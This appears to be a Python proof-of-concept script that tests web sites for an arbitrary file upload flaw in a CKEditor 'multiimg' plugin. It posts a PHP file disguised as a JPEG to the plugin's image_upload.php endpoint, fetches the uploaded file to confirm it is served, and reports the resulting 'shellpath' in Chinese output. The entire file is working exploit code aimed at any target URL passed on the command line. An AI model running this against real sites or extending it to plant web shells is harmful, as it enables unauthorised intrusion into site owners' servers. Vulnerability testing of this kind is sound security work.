#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}

def verify(site):
    burp0_url = site + "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryohctpmzp", "Accept-Encoding": "gzip"}
    burp0_data = "------WebKitFormBoundaryohctpmzp\r\nContent-Disposition: form-data; name=\"files\"; filename=\"vulntest.php\"\r\nContent-Type: image/jpeg\r\n\r\nvulntest\r\n------WebKitFormBoundaryohctpmzp--\r\n"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if r.status_code == 200 and "result" in r.json() and r.json()["result"] == "200":
        shellpath = site + "/Common/" + r.json()["imgurl"]
        r2 = requests.get(shellpath, verify=False)
        if "vulntest" in r2.text:
            return shellpath

    return ""


    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
